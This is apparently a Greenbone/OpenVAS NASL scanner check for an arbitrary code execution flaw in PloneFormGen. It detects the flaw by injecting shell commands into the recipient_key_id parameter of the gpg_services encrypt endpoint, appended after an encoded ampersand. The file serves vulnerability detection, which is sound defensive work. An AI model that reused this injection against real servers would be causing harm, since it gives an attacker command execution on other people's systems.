CPE = "cpe:/a:plone:plone";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103736" );
	script_bugtraq_id( 60247 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "9.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:P/A:P" );
	script_name( "PloneFormGen Arbitrary Code Execution Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/60247" );
	script_xref( name: "URL", value: "http://plone.org/" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-06-12 11:35:33 +0200 (Wed, 12 Jun 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_plone_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "plone/installed" );
	script_tag( name: "solution", value: "Updates are available. Please see the references or vendor advisory
for more information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "PloneFormGen is prone to an arbitrary code-execution vulnerability.

An attacker can leverage this issue to execute arbitrary code within
the context of the application.

PloneFormGen 1.7.4 through 1.7.8 are vulnerable, other versions may
also be affected." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
cmds = exploit_commands();
for cmd in keys( cmds ) {
	url = dir + "/@@gpg_services/encrypt?data=&recipient_key_id=%26" + cmds[cmd];
	if(http_vuln_check( port: port, url: url, pattern: cmd )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

